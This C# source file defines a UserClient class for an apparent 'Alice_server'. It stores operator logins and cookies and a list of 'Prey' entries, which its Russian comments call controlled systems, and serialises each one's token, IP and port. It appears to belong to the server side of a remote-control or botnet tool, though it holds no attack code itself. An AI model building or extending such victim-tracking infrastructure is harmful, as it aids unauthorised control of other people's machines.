using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Xml;

namespace Alice_server
{
    class UserClient
    {
        public int _ID_USER { get; set; } //ID юзера
        public string _cookies { get; set; } // _cookies юзера
        public string _Login { get; set; } // _Login юзера 
        public IPEndPoint _now_ip_port { get; set; } //последний IP
        //public bool server { get; set; } //как сервер ?
        public bool online { get; set; } //как клиент ?
        public List<Prey> _all_sacrifice { get; set; }  //Список контролируемых систем
        
        public UserClient()
        {
            
        }
        public UserClient(int _ID_USER)
        {
            this._ID_USER = _ID_USER;
        }
        public UserClient(string _Login, string _cookies, int _ID_USER)
        {
            this._ID_USER = _ID_USER;
            this._cookies = _cookies;
            this._Login = _Login;
            
        }
        public UserClient(string _Login, string _cookies, int _ID_USER,List<Prey> _all_sacrifice)
        {
            this._ID_USER = _ID_USER;
            this._cookies = _cookies;
            this._Login = _Login;
            this._all_sacrifice = _all_sacrifice;
        }

        public string Authorization()
        {
            return "[" + _ID_USER + "][" + _cookies + "][" + _Login + "]";
        }

        public string _AllSacrificeToString()
        {
            string str = "";
            if (_all_sacrifice != null)
            {
                foreach (var _one in this._all_sacrifice)
                {
                    str += "[" + _one.Name_sacrifice + "][" +
                              _one.Token_sacrifice + "][" +
                              _one.online + "][" +
                              _one.ip.Address.ToString() + "][" +
                              _one.ip.Port + "]";

                }
            }
            return str;

        }


    }
}
